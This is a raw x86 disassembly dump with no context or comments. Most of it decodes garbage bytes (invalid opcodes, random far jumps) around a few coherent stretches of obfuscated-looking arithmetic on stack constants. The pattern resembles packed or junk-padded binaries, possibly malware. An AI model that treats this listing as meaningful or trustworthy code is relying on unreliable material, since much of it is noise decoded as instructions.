  412046:	clc    
  412047:	int3   
  412048:	xor    eax,DWORD PTR [ebx-0x44]
  41204b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41204c:	ret    
  41204d:	sbb    DWORD PTR [esi-0x56],edx
  412050:	and    al,0x7
  412052:	pop    esp
  412053:	imul   edi,DWORD PTR [ecx],0xffffffbb
  412056:	sbb    al,0x13
  412058:	test   al,0xf1
  41205a:	push   0x7279652d
  41205f:	xchg   esi,eax
  412060:	ret    0xf761
  412063:	sub    eax,0x7fda10f6
  412068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412069:	xchg   edi,eax
  41206a:	dec    ebx
  41206b:	imul   esp,DWORD PTR [ebp-0x283121b3],0xdc9adf94
  412075:	sbb    eax,0x4b709a9a
  41207a:	jcxz   0x41203e
  41207d:	retf   0xe654
  412080:	ret    
  412081:	fcompp 
  412083:	imul   esi,DWORD PTR [eax+0x386faf97],0x79906fff
  41208d:	loopne 0x4120af
  41208f:	int    0x9b
  412091:	adc    DWORD PTR [ecx+eiz*4+0x2f4cc352],0x19
  412099:	cmp    bh,BYTE PTR [eax]
  41209b:	xchg   BYTE PTR [edx+0x151daf32],dh
  4120a1:	stc    
  4120a2:	add    al,0xb0
  4120a4:	jl     0x41202b
  4120a6:	cdq    
  4120a7:	pop    esp
  4120a8:	sub    eax,0x8aaab56b
  4120ad:	arpl   ax,dx
  4120af:	sti    
  4120b0:	fisub  WORD PTR [edi+edx*8-0x1e]
  4120b4:	mov    cl,0x29
  4120b6:	inc    ebp
  4120b7:	mov    edx,0x8216c4d2
  4120bc:	mov    ch,0x94
  4120be:	or     edi,edx
  4120c0:	stos   DWORD PTR es:[edi],eax
  4120c1:	cdq    
  4120c2:	call   0x244930e3
  4120c7:	arpl   sp,si
  4120c9:	jg     0x41210e
  4120cb:	scas   al,BYTE PTR es:[edi]
  4120cc:	jle    0x412106
  4120ce:	cmp    esi,DWORD PTR [ebp-0x5e]
  4120d1:	adc    eax,0xfe1f0c21
  4120d6:	ror    ch,1
  4120d8:	js     0x412082
  4120da:	xchg   esi,eax
  4120db:	mov    ecx,ebp
  4120dd:	imul   DWORD PTR [esi]
  4120df:	cmp    ebx,DWORD PTR [ebx]
  4120e1:	lahf   
  4120e2:	fidiv  WORD PTR [ecx+eax*1-0x89947be]
  4120e9:	mov    DWORD PTR [ecx+0x159ac099],esp
  4120ef:	mov    BYTE PTR [esi+0x721ad8d3],dh
  4120f5:	xchg   ecx,eax
  4120f6:	lock cmp BYTE PTR [edx-0x28],ah
  4120fa:	in     eax,dx
  4120fb:	jp     0x41214e
  4120fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120fe:	int3   
  4120ff:	mov    esp,0xe1a28002
  412104:	dec    esp
  412105:	ret    
  412106:	sub    eax,0xc8f4c443
  41210b:	retf   0x9def
  41210e:	ret    
  41210f:	lds    ebp,FWORD PTR [edi-0x7a55ccdc]
  412115:	jp     0x412139
  412117:	jge    0x41214d
  412119:	jnp    0x4120da
  41211b:	push   esi
  41211c:	add    BYTE PTR [ebx+edi*2+0x32eb7700],ah
  412123:	sub    dl,BYTE PTR [ebx+0x1f]
  412126:	ins    DWORD PTR es:[edi],dx
  412127:	leave  
  412128:	js     0x4120af
  41212a:	and    BYTE PTR [eax-0x75],bl
  41212d:	mov    cl,0x3f
  41212f:	inc    esp
  412130:	adc    BYTE PTR [ecx+esi*8-0x36],0x20
  412135:	sub    BYTE PTR [esi+0x33c94691],dh
  41213b:	jnp    0x4121a4
  41213d:	dec    ecx
  41213e:	xor    al,0x90
  412140:	fistp  QWORD PTR [ebx+0x3718d318]
  412146:	scas   eax,DWORD PTR es:[edi]
  412147:	xlat   BYTE PTR ds:[ebx]
  412148:	div    bl
  41214a:	shl    edi,1
  41214c:	inc    eax
  41214d:	cld    
  41214e:	enter  0xab3b,0xa3
  412152:	leave  
  412153:	pop    edi
  412154:	fs mov ebx,0x8ea6f8da
  41215a:	or     dh,BYTE PTR [eax+0xad9026f]
  412160:	sub    esi,ebx
  412162:	push   edi
  412163:	loopne 0x41214f
  412165:	imul   eax,DWORD PTR [edi-0x63],0x10
  412169:	push   cs
  41216a:	jne    0x41212b
  41216c:	mov    al,ds:0x4840f545
  412171:	cmc    
  412172:	popf   
  412173:	das    
  412174:	jne    0x412117
  412176:	repnz mov ds:0xf6692a68,eax
  41217c:	fnstenv [ecx]
  41217e:	sbb    bl,bl
  412180:	mov    dl,0xb7
  412182:	pop    ebx
  412183:	cs out 0x48,al
  412186:	stos   DWORD PTR es:[edi],eax
  412187:	jbe    0x412184
  412189:	mov    ah,0xf5
  41218b:	addr16 push edi
  41218d:	das    
  41218e:	mov    bh,0xb7
  412190:	and    BYTE PTR [edx],0x1f
  412193:	loopne 0x4121be
  412195:	dec    si
  412197:	adc    bh,ah
  412199:	icebp  
  41219a:	fwait
  41219b:	mov    cl,BYTE PTR [esi+0x1152a707]
  4121a1:	je     0x412219
  4121a3:	inc    esp
  4121a4:	mov    dh,0x1d
  4121a6:	or     DWORD PTR fs:[ebx+0x7878e270],0xf40806a8
  4121b1:	mov    ecx,0x5aa75c45
  4121b6:	and    esi,DWORD PTR [edi+0x72bf1f2b]
  4121bc:	rcl    DWORD PTR [edx-0x63cd5cc2],0xce
  4121c3:	push   es
  4121c4:	in     al,dx
  4121c5:	lds    edi,FWORD PTR [edx+0x9b845a1]
  4121cb:	popa   
  4121cc:	shr    dh,0x85
  4121cf:	ror    BYTE PTR [ecx+0x66],0xcd
  4121d3:	xor    DWORD PTR [eax+esi*1-0x890c067],ecx
  4121da:	sbb    eax,0xeec6dd0a
  4121df:	jno    0x412168
  4121e1:	in     eax,0x72
  4121e3:	xchg   DWORD PTR [ebx+0x605f7101],ebp
  4121e9:	or     al,0xe9
  4121eb:	mov    ecx,0x3be6f60c
  4121f0:	stos   BYTE PTR es:[edi],al
  4121f1:	jmp    0x89a3:0x6a3b09a4
  4121f8:	or     BYTE PTR [eax+0x4f],dl
  4121fb:	sub    DWORD PTR ds:0x1357b251,ebx
  412201:	call   0xb1462079
  412206:	sub    al,0x37
  412208:	pushf  
  412209:	sahf   
  41220a:	add    ebx,eax
  41220c:	jmp    0x412276
  41220e:	and    BYTE PTR [ebx-0x3d],bh
  412211:	in     al,0x35
  412213:	test   BYTE PTR [eax],bh
  412215:	add    BYTE PTR [eax],al
  412217:	mov    eax,DWORD PTR [eax+edx*1]
  41221a:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  412221:	mov    eax,DWORD PTR [ebp-0x34]
  412224:	mov    edx,DWORD PTR [ebp-0xb4]
  41222a:	lea    eax,[edx+eax*1-0x76d2]
  412231:	mov    edx,DWORD PTR [ebp-0x44]
  412234:	mov    esi,DWORD PTR [ebp-0x84]
  41223a:	or     eax,edx
  41223c:	xor    edx,edx
  41223e:	div    esi
  412240:	mov    edx,DWORD PTR [ebp-0x54]
  412243:	add    eax,0x43d7
  412248:	xor    eax,0x5e6a
  41224d:	add    eax,DWORD PTR [edx+ecx*1]
  412250:	mov    ecx,DWORD PTR ds:0x4225ac
  412256:	add    DWORD PTR [eax],ecx
  412258:	mov    eax,DWORD PTR [ebp-0x90]
  41225e:	mov    ecx,DWORD PTR [ebp-0x8c]
  412264:	mov    edx,DWORD PTR [ebp-0xa0]
  41226a:	mov    esi,DWORD PTR [ebp-0x9c]
  412270:	sub    edx,eax
  412272:	mov    eax,DWORD PTR [ebp-0xb0]
  412278:	sbb    esi,ecx
  41227a:	mov    ecx,DWORD PTR [ebp-0xac]
  412280:	xor    edx,eax
  412282:	mov    eax,DWORD PTR [ebp-0xc0]
  412288:	xor    esi,ecx
  41228a:	mov    ecx,DWORD PTR [ebp-0xbc]
  412290:	jmp    0x412505
  412295:	mov    ah,0x74
  412297:	xchg   edx,eax
  412298:	cli    
  412299:	push   edx
  41229a:	fistp  DWORD PTR [edx+ebx*1]
  41229d:	cs jge 0x4122b6
  4122a0:	stos   BYTE PTR es:[edi],al
  4122a1:	pushf  
  4122a2:	fldz   
  4122a4:	mov    esi,0x181860fe
  4122a9:	jno    0x4122bf
  4122ab:	sbb    BYTE PTR [eax],bl
  4122ad:	jno    0x412290
  4122af:	jne    0x4122a9
  4122b1:	pusha  
  4122b2:	mov    ebp,0x384e4e64
  4122b7:	test   BYTE PTR [ecx+0x11],cl
  4122ba:	cmp    DWORD PTR [edx+0x58],ebp
  4122bd:	jne    0x41229c
  4122bf:	pop    ebx
  4122c0:	sub    DWORD PTR [edx],ebp
  4122c2:	aas    
  4122c3:	outs   dx,DWORD PTR ds:[esi]
  4122c4:	aaa    
  4122c5:	leave  
  4122c6:	xchg   ebx,eax
  4122c7:	std    
  4122c8:	test   BYTE PTR [esp+eax*8-0x5f],ch
  4122cc:	out    0x57,eax
  4122ce:	mov    al,0xe7
  4122d0:	in     eax,dx
  4122d1:	cmp    eax,0x5dee8a08
  4122d6:	(bad)  
  4122d7:	jno    0x412300
  4122d9:	or     BYTE PTR [edx],cl
  4122db:	leave  
  4122dc:	out    0xb5,al
  4122de:	mov    al,0x91
  4122e0:	and    DWORD PTR [edx],edx
  4122e2:	pop    ebp
  4122e3:	mov    bl,0xe1
  4122e5:	jmp    0x4122ad
  4122e7:	cmp    DWORD PTR [ebp+edi*8+0x1b30d58a],esi
  4122ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122ef:	mov    ebp,0x82ad721b
  4122f4:	neg    BYTE PTR [eax+ebx*4+0x4ae31f41]
  4122fb:	sti    
  4122fc:	(bad)  
  4122fe:	out    dx,eax
  4122ff:	aas    
  412300:	add    ch,BYTE PTR ds:0x3c793d77
  412306:	adc    DWORD PTR [edi-0x4b85cd33],0x71fed996
  412310:	xchg   esi,eax
  412311:	mov    edx,0xe53b2654
  412316:	outs   dx,DWORD PTR ds:[esi]
  412317:	imul   edx,DWORD PTR [ebx+eiz*4],0xffffffd1
  41231b:	jl     0x412366
  41231d:	mov    ecx,0x64a331a8
  412322:	mov    eax,ds:0x1a9a5721
  412327:	popa   
  412328:	mov    ecx,0x867bc991
  41232d:	mov    ebp,0x1a3ea9fe
  412332:	fiadd  DWORD PTR [edx-0x2f]
  412335:	int3   
  412336:	and    BYTE PTR [edi+eiz*4],0xf8
  41233a:	lods   al,BYTE PTR ds:[esi]
  41233b:	data16 jp 0x41234f
  41233e:	mov    dl,0x3c
  412340:	or     DWORD PTR [edi-0x28],edx
  412343:	push   ecx
  412344:	jmp    0x41236e
  412346:	jns    0x4122f0
  412348:	adc    BYTE PTR [ebp+0x4003fa6f],0xbe
  41234f:	cs dec eax
  412351:	xor    bh,dh
  412353:	test   al,0xaa
  412355:	add    DWORD PTR [edx-0xf],edi
  412358:	je     0x412390
  41235a:	jbe    0x4122e8
  41235c:	inc    eax
  41235d:	iret   
  41235e:	out    dx,al
  41235f:	test   dl,bh
  412361:	mov    ds:0xac1bc7d3,eax
  412366:	aaa    
  412367:	ja     0x41236d
  412369:	(bad)  
  41236b:	xchg   esp,eax
  41236c:	add    DWORD PTR [edx-0x6a82a54],esp
  412372:	inc    esp
  412373:	cld    
  412374:	loope  0x412335
  412376:	mov    bl,0x67
  412378:	sub    eax,DWORD PTR [eax+0xd]
  41237b:	std    
  41237c:	mov    edx,0xaeda93ea
  412381:	xor    DWORD PTR gs:[ecx],0xed7edc6d
  412388:	imul   ecx,eax,0xea616c89
  41238e:	mov    cl,dl
  412390:	jb     0x4123c8
  412392:	fsubr  DWORD PTR [edx]
  412394:	(bad)  
  412396:	push   cs
  412397:	jle    0x41235e
  412399:	mov    edx,0xcc8cc1a7
  41239e:	push   eax
  41239f:	add    eax,0x8e571281
  4123a4:	add    edi,DWORD PTR [edx-0x6c68f98c]
  4123aa:	mov    al,0xb1
  4123ac:	cmp    DWORD PTR [ebx-0x3f],ebp
  4123af:	jecxz  0x41236e
  4123b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123b2:	push   eax
  4123b3:	and    BYTE PTR [ecx+0x2de46b93],al
  4123b9:	pop    eax
  4123ba:	fcmovnu st,st(5)
  4123bc:	or     eax,0xbfddf5a3
  4123c1:	and    cl,BYTE PTR [eax]
  4123c3:	cmp    BYTE PTR [edx-0x39],dl
  4123c6:	fcmove st,st(5)
  4123c8:	pop    edx
  4123c9:	sbb    dl,BYTE PTR [eax-0x61e0e18a]
  4123cf:	and    BYTE PTR [ebx],ch
  4123d1:	fs dec edx
  4123d3:	sbb    eax,0xc7c66434
  4123d8:	inc    esp
  4123d9:	xchg   cl,ah
  4123db:	or     al,0xde
  4123dd:	pop    edi
  4123de:	and    ecx,DWORD PTR [ecx+0x720691a8]
  4123e4:	inc    esi
  4123e5:	sbb    edx,edx
  4123e7:	cmp    cl,BYTE PTR [ebx+0x1f]
  4123ea:	xchg   ecx,eax
  4123eb:	mov    al,0xc6
  4123ed:	test   DWORD PTR [edi],ebx
  4123ef:	lahf   
  4123f0:	out    dx,al
  4123f1:	mov    ds:0xfcab88d0,al
  4123f6:	pop    esp
  4123f7:	dec    esi
  4123f8:	fsubrp st(1),st
  4123fa:	xchg   edx,eax
  4123fb:	hlt    
  4123fc:	xchg   ebp,eax
  4123fd:	adc    eax,0x8e367dba
  412402:	scas   eax,DWORD PTR es:[edi]
  412403:	lds    ecx,FWORD PTR [eax-0xa]
  412406:	in     eax,dx
  412407:	test   BYTE PTR [edx],al
  412409:	retf   
  41240a:	add    esi,DWORD PTR [ebx]
  41240c:	bound  eax,QWORD PTR [edi-0x266f29cd]
  412412:	mov    ds:0xd7686286,al
  412417:	lods   eax,DWORD PTR ds:[esi]
  412418:	adc    BYTE PTR [eax-0x50],0xce
  41241c:	or     al,0xa7
  41241e:	retf   0x4d6e
  412421:	out    dx,eax
  412422:	(bad)  
  412423:	mov    dl,0xfc
  412425:	iret   
  412426:	inc    esp
  412427:	push   eax
  412428:	mov    cs,WORD PTR [ecx+0x4342ccea]
  41242e:	or     ch,BYTE PTR [edi+0x4d78766a]
  412434:	or     bh,BYTE PTR [esi+0x7d]
  412437:	mov    esi,0xdb72b727
  41243c:	lea    esi,cs:[edx+0x6fe64e7d]
  412443:	dec    edx
  412444:	mov    esi,0x197876e2
  412449:	jp     0x4124c5
  41244b:	cld    
  41244c:	mov    DWORD PTR [ebx],esp
  41244e:	nop
  41244f:	push   edi
  412450:	sbb    eax,DWORD PTR [ecx-0x76686308]
  412456:	stc    
  412457:	dec    ebx
  412458:	int    0x6d
  41245a:	call   0x709f:0xdceb73a3
  412461:	mov    ah,0xd4
  412463:	loopne 0x4124df
  412465:	clc    
  412466:	retf   
  412467:	jo     0x412443
  412469:	loope  0x4123ed
  41246b:	rol    BYTE PTR [edi],0x9
  41246e:	(bad)  
  41246f:	ficomp DWORD PTR [esi-0x7f3131da]
  412475:	inc    esi
  412476:	mov    ch,BYTE PTR [edi]
  412478:	idiv   bh
  41247a:	add    dh,cl
  41247c:	xor    eax,0xb229697d
  412481:	stos   BYTE PTR es:[edi],al
  412482:	in     al,0x76
  412484:	and    eax,0x5a2d3a9
  412489:	in     al,0xd5
  41248b:	das    
  41248c:	add    al,0xf3
  41248e:	fimul  WORD PTR cs:[edx+0x74]
  412492:	loope  0x41242d
  412494:	and    BYTE PTR [edi+0x51],0x87
  412498:	cs je  0x41250d
  41249b:	inc    esi
  41249c:	adc    BYTE PTR [eax-0x4696187],cl
  4124a2:	pop    esp
  4124a3:	sub    eax,DWORD PTR ss:[eax+0x9]
  4124a7:	push   esp
  4124a8:	or     DWORD PTR [ecx],esp
  4124aa:	sub    eax,0x6d8cd019
  4124af:	(bad)  
  4124b0:	ret    0xbd8d
  4124b3:	not    BYTE PTR [ecx-0x4b]
  4124b6:	inc    edi
  4124b7:	(bad)  
  4124b9:	cmc    
  4124ba:	xor    ch,BYTE PTR [esi-0x2c07e90d]
  4124c0:	jle    0x41251d
  4124c2:	push   0x48
  4124c4:	icebp  
  4124c5:	and    DWORD PTR [edx+0x18],esi
  4124c8:	cdq    
  4124c9:	lock jle 0x412508
  4124cc:	ror    DWORD PTR [eax+0x5],1
  4124cf:	push   ebp
  4124d0:	adc    dh,BYTE PTR [ebp+ebp*1-0xf]
  4124d4:	dec    esi
  4124d5:	add    DWORD PTR [eax-0x66],0xffffffa4
  4124d9:	inc    edx
  4124da:	cmovae esi,DWORD PTR [edi+ecx*2+0x2809fc81]
  4124e2:	mov    dh,0x5
  4124e4:	call   0xdf39a923
  4124e9:	les    edx,FWORD PTR [ebx-0x39]
  4124ec:	or     al,0x11
  4124ee:	lahf   
  4124ef:	sbb    al,0xef
  4124f1:	imul   eax,DWORD PTR [eax-0x7e830295],0xffffffa4
  4124f8:	inc    ebx
  4124f9:	out    0x83,eax
  4124fb:	cdq    
  4124fc:	ins    DWORD PTR es:[edi],dx
  4124fd:	call   0xe1d3:0x599d60ed
  412504:	add    DWORD PTR [ebx],0x81f113d0
  41250a:	ret    0x2313
  41250d:	add    BYTE PTR [eax],al
  41250f:	adc    esi,0x2a00
  412515:	push   esi
  412516:	push   edx
  412517:	call   0x42202c
  41251c:	mov    ecx,0x1207
  412521:	sub    ecx,eax
  412523:	push   0x0
  412525:	pop    eax
  412526:	jmp    0x41279b
  41252b:	jae    0x41252c
  41252d:	mov    dl,0xf5
  41252f:	sbb    bl,BYTE PTR [ebx+esi*1-0x74c2fe82]
  412536:	jo     0x412502
  412538:	push   ds
  412539:	or     al,0x7e
  41253b:	push   edi
  41253c:	pop    esp
  41253d:	sbb    BYTE PTR [eax],bl
  41253f:	jno    0x412555
  412541:	sbb    BYTE PTR [eax],bl
  412543:	mov    bh,0x49
  412545:	(bad)  
  412547:	jl     0x412572
  412549:	cmc    
  41254a:	mov    eax,ds:0x7b58738d
  41254f:	jo     0x412569
  412551:	mov    dl,0x5c
  412553:	push   edx
  412554:	inc    ebp
  412555:	mov    ecx,0x5f884ba7
  41255a:	adc    al,0xb9
  41255c:	push   edx
  41255d:	cmp    al,ch
  41255f:	in     eax,dx
  412560:	push   esp
  412561:	dec    edx
  412562:	imul   ebp,DWORD PTR [ebp-0x8],0xffffffb7
  412566:	rep lods eax,DWORD PTR ds:[esi]
  412568:	sub    esp,ebp
  41256a:	retf   
  41256b:	jmp    0x886c6cec
  412570:	jmp    0x4e87a343
  412575:	xchg   DWORD PTR [eax+0x78],edx
  412578:	aaa    
  412579:	pop    ds
  41257a:	push   es
  41257b:	xchg   ebp,eax
  41257c:	icebp  
  41257d:	push   0xfffffff8
  41257f:	jbe    0x4125af
  412581:	mov    WORD PTR [edi],cs
  412583:	xor    al,0x7f
  412585:	in     al,dx
  412586:	inc    eax
  412587:	test   eax,0xf1d286fa
  41258c:	pop    ds
  41258d:	or     BYTE PTR [ebx+0x60bd1b3],dh
  412593:	(bad)  
  412594:	es pop ebp
  412596:	adc    ah,BYTE PTR [eax]
  412598:	mov    al,0xf5
  41259a:	dec    edx
  41259b:	bndstx [edi+0x11cca6a9],bnd2
  4125a2:	sbb    eax,0xa3e57331
  4125a7:	cwde   
  4125a8:	inc    esi
  4125a9:	push   es
  4125aa:	lds    eax,FWORD PTR [eax-0x6f]
  4125ad:	jbe    0x412545
  4125af:	mov    ecx,DWORD PTR [eax]
  4125b1:	inc    esp
  4125b2:	sub    eax,0x4d59c56a
  4125b7:	push   ebx
  4125b8:	mov    WORD PTR ds:0xad57dfec,ds
  4125be:	adc    BYTE PTR [edi-0x2a257fcc],ch
  4125c4:	push   esp
  4125c5:	test   DWORD PTR [ecx+0x59],esi
  4125c8:	cmc    
  4125c9:	mov    WORD PTR [ecx+0x55],gs
  4125cc:	aad    0x8d
  4125ce:	or     DWORD PTR [ecx+0xd],ebx
  4125d1:	sbb    ecx,DWORD PTR [eax+0x743e69f1]
  4125d7:	push   es
  4125d8:	mov    bh,BYTE PTR [edi+0x36]
  4125db:	push   esp
  4125dc:	in     al,dx
  4125dd:	adc    DWORD PTR ds:0x864ac536,0x30
  4125e4:	cmp    al,0xbc
  4125e6:	xchg   DWORD PTR [eax],edx
  4125e8:	int    0xc0
  4125ea:	nop
  4125eb:	rol    BYTE PTR [ecx],cl
  4125ed:	jge    0x412649
  4125ef:	jmp    0x4125a2
  4125f1:	sbb    al,0x38
  4125f3:	adc    al,0x54
  4125f5:	mov    edx,0x7a55d33e
  4125fa:	ficomp WORD PTR [ebx-0x21a161cb]
  412600:	sbb    BYTE PTR [ebx+0x739f1e9c],cl
  412606:	leave  
  412607:	mov    edi,0x1048694a
  41260c:	clc    
  41260d:	or     BYTE PTR [esi],dh
  41260f:	int    0x13
  412611:	adc    BYTE PTR [edi+0x3a],dh
  412614:	(bad)  
  412615:	jecxz  0x4125fe
  412617:	adc    DWORD PTR [ebx-0x11],edx
  41261a:	xchg   esi,eax
  41261b:	add    ecx,DWORD PTR [edx+edx*1]
  41261e:	mov    edi,0xc7037494
  412623:	popa   
  412624:	rcl    BYTE PTR [esi-0x64],0x62
  412628:	jl     0x4126a3
  41262a:	pop    esi
  41262b:	js     0x412620
  41262d:	fldcw  WORD PTR ds:0xeb7efafd
  412633:	jmp    0x41263c
  412635:	inc    eax
  412636:	out    dx,al
  412637:	in     al,0xd8
  412639:	out    0x48,eax
  41263b:	or     edi,DWORD PTR [esi]
  41263d:	mov    dh,0x9d
  41263f:	inc    edx
  412640:	adc    esi,ebp
  412642:	xchg   ebp,eax
  412643:	pop    ebp
  412644:	mov    ds:0x97c81042,eax
  412649:	lock sahf 
  41264b:	sbb    al,0x14
  41264d:	cmp    esp,DWORD PTR [esi]
  41264f:	sbb    DWORD PTR [edi-0x79a6d82],esp
  412655:	add    ecx,DWORD PTR [edx+0x3eac16e9]
  41265b:	dec    ebx
  41265c:	pop    edx
  41265d:	or     cl,cl
  41265f:	popf   
  412660:	mov    ebx,0xd30df375
  412665:	ret    0xada7
  412668:	sahf   
  412669:	ret    0xa5c1
  41266c:	pusha  
  41266d:	mov    BYTE PTR [ebx],bh
  41266f:	or     eax,0x42036de2
  412674:	mov    edx,0xb201edde
  412679:	out    0x4e,eax
  41267b:	cmc    
  41267c:	fcomp  QWORD PTR [esi+ebx*2+0x34]
  412680:	push   cs
  412681:	outs   dx,BYTE PTR ds:[esi]
  412682:	ret    0x9322
  412685:	out    dx,eax
  412686:	mov    edi,0xc5ffbf65
  41268b:	sub    DWORD PTR [esi+ecx*4+0x11],eax
  41268f:	lock jl 0x412673
  412692:	mov    edi,0x645a5480
  412697:	mov    esp,DWORD PTR [eax]
  412699:	push   esi
  41269a:	push   ss
  41269b:	and    DWORD PTR [ecx],eax
  41269d:	pop    edx
  41269e:	pop    ds
  41269f:	mov    edx,0xe90ac83c
  4126a4:	add    DWORD PTR [edx+0x6b],ebp
  4126a7:	cwde   
  4126a8:	xchg   edi,eax
  4126a9:	mov    ch,0xc0
  4126ab:	jb     0x412644
  4126ad:	inc    esi
  4126ae:	xchg   esp,eax
  4126af:	dec    edx
  4126b0:	inc    esi
  4126b1:	xchg   ebx,eax
  4126b2:	stos   BYTE PTR es:[edi],al
  4126b3:	sbb    BYTE PTR [esi],dl
  4126b5:	mov    ebp,0xc490fb6a
  4126ba:	mov    esi,0xc0f2709d
  4126bf:	push   eax
  4126c0:	(bad)  
  4126c1:	in     eax,dx
  4126c2:	test   esp,0xa663c1c4
  4126c8:	es jmp 0x4c6f:0x77ec7183
  4126d0:	stos   DWORD PTR es:[edi],eax
  4126d1:	mov    ebx,0x7532d25d
  4126d6:	xchg   ecx,eax
  4126d7:	ficomp WORD PTR [edi+0x53]
  4126da:	icebp  
  4126db:	xchg   DWORD PTR [ebp-0x66],ecx
  4126de:	outs   dx,BYTE PTR ds:[esi]
  4126df:	dec    bh
  4126e1:	xor    BYTE PTR [ebp-0x2285dd01],ah
  4126e7:	dec    edi
  4126e8:	jmp    0xfb45:0x64cea0c2
  4126ef:	sti    
  4126f0:	ja     0x4126ce
  4126f2:	adc    ebp,DWORD PTR [eax]
  4126f4:	repz mov dl,BYTE PTR [edi+0x6ffe591e]
  4126fb:	xabort 0x7a
  4126fe:	xor    al,BYTE PTR [ecx-0x3c8adb]
  412704:	lahf   
  412705:	daa    
  412706:	(bad)  
  412707:	mov    dl,0xe
  412709:	xlat   BYTE PTR ds:[ebx]
  41270a:	call   0xadff:0x448cf9e5
  412711:	or     eax,0xbaa75f12
  412716:	sub    BYTE PTR [edi+0x22641101],dl
  41271c:	add    ecx,eax
  41271e:	dec    esi
  41271f:	mov    bl,0x90
  412721:	xor    DWORD PTR [ebx+0x19],ecx
  412724:	and    al,0x88
  412726:	sub    ebx,DWORD PTR [esi+0xf910ab6]
  41272c:	cwde   
  41272d:	cwde   
  41272e:	inc    esi
  41272f:	enter  0x1dd1,0x18
  412733:	push   ebp
  412734:	sbb    bl,BYTE PTR [eax+0xe]
  412737:	stc    
  412738:	sbb    al,0x2d
  41273a:	les    ecx,FWORD PTR [ebp+0x4e]
  41273d:	stos   DWORD PTR es:[edi],eax
  41273e:	mov    ch,0x5e
  412740:	mov    ebp,0x6b111528
  412745:	pusha  
  412746:	int    0x77
  412748:	push   ebx
  412749:	hlt    
  41274a:	adc    BYTE PTR [ebx],dh
  41274c:	mov    bh,0x57
  41274e:	sub    al,BYTE PTR [ecx+edx*1]
  412751:	pop    eax
  412752:	adc    DWORD PTR [ebx],ebx
  412754:	and    cl,al
  412756:	push   ds
  412757:	sub    eax,0x2d6c3ae7
  41275c:	and    al,0xf7
  41275e:	lods   eax,DWORD PTR ds:[esi]
  41275f:	inc    esp
  412760:	and    cl,BYTE PTR [ebx+0x32]
  412763:	mov    es,WORD PTR [esp+eax*2]
  412766:	push   eax
  412767:	stos   DWORD PTR es:[edi],eax
  412768:	cdq    
  412769:	jno    0x412753
  41276b:	pop    ebx
  41276c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41276d:	inc    ebx
  41276e:	loope  0x412753
  412770:	jge    0x412705
  412772:	(bad)  
  412773:	rcl    DWORD PTR [ecx-0x1913941f],1
  412779:	lock jnp 0x412761
  41277c:	jb     0x41271b
  41277e:	cs push es
  412780:	inc    edi
  412781:	mov    edi,0xec8161cb
  412786:	popa   
  412787:	scas   eax,DWORD PTR es:[edi]
  412788:	ja     0x412753
  41278a:	sti    
  41278b:	jge    0x4127f0
  41278d:	push   0xffffff93
  41278f:	mov    fs,WORD PTR [eax]
  412791:	(bad)  [eax]
  412793:	add    al,0xad
  412795:	jg     0x4127a3
  412797:	push   ebx
  412798:	mov    edx,0xc21b07a8
  41279d:	mov    edx,DWORD PTR ds:0x4225ac
  4127a3:	xor    esi,esi
  4127a5:	cmp    edx,ecx
  4127a7:	jne    0x4127da
  4127ad:	cmp    esi,eax
  4127af:	jne    0x4127da
  4127b5:	mov    eax,DWORD PTR [ebp-0x4]
  4127b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4127bb:	add    eax,0x4296
  4127c0:	shr    eax,0x2
  4127c3:	or     eax,ecx
  4127c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4127c8:	xor    eax,ecx
  4127ca:	xor    eax,0x4e94
  4127cf:	add    eax,DWORD PTR ds:0x4225ac
  4127d5:	mov    ds:0x4225b4,eax
  4127da:	pop    esi
  4127db:	leave  
  4127dc:	ret    0x4
  4127df:	push   ebp
  4127e0:	mov    ebp,esp
  4127e2:	sub    esp,0x58
  4127e5:	push   ebx
  4127e6:	push   esi
  4127e7:	push   edi
  4127e8:	mov    DWORD PTR [ebp-0x58],0x3082
  4127ef:	mov    DWORD PTR [ebp-0x54],0x37a2
  4127f6:	mov    DWORD PTR [ebp-0x50],0x49d6
  4127fd:	mov    DWORD PTR [ebp-0x4c],0x6390
  412804:	mov    DWORD PTR [ebp-0x48],0x40f2
  41280b:	mov    DWORD PTR [ebp-0x44],0x21d4
  412812:	mov    DWORD PTR [ebp-0x28],0x4726
  412819:	mov    DWORD PTR [ebp-0x24],0x221a
  412820:	mov    DWORD PTR [ebp-0x30],0x768c
  412827:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41282e:	mov    DWORD PTR [ebp-0x40],0x6cf6
  412835:	mov    DWORD PTR [ebp-0x3c],0x94c
  41283c:	mov    DWORD PTR [ebp-0x38],0x4797
  412843:	mov    DWORD PTR [ebp-0x34],0x4439
  41284a:	mov    DWORD PTR [ebp-0x20],0x2531
  412851:	mov    esi,0x5a3e
  412856:	mov    DWORD PTR [ebp-0x1c],esi
  412859:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  412860:	mov    DWORD PTR [ebp-0x14],0x7
  412867:	mov    DWORD PTR [ebp-0x10],0xe3a
  41286e:	mov    DWORD PTR [ebp-0xc],0x6a6e
  412875:	mov    DWORD PTR [ebp-0x8],0x6b99
  41287c:	mov    DWORD PTR [ebp-0x4],0x2acd
  412883:	mov    eax,DWORD PTR [ebp-0x10]
  412886:	mov    ecx,DWORD PTR [ebp-0xc]
  412889:	mov    eax,DWORD PTR [ebp-0x8]
  41288c:	mov    ecx,DWORD PTR [ebp-0x4]
  41288f:	mov    eax,DWORD PTR [ebp-0x18]
  412892:	mov    ecx,DWORD PTR [ebp-0x14]
  412895:	jmp    0x412c6d
  41289a:	icebp  
  41289b:	not    esi
  41289d:	xchg   ecx,eax
  41289e:	into   
  41289f:	xor    DWORD PTR [esi],ebp
  4128a1:	jbe    0x4128b2
  4128a3:	cmc    
  4128a4:	gs mov esp,0x7cb308dc
  4128aa:	scas   al,BYTE PTR es:[edi]
  4128ab:	pop    eax
  4128ac:	sbb    BYTE PTR [eax],bl
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	adc    bl,BYTE PTR [eax]
  4128b1:	sbb    BYTE PTR [esi-0x60],ch
  4128b4:	test   al,ah
  4128b6:	(bad)  
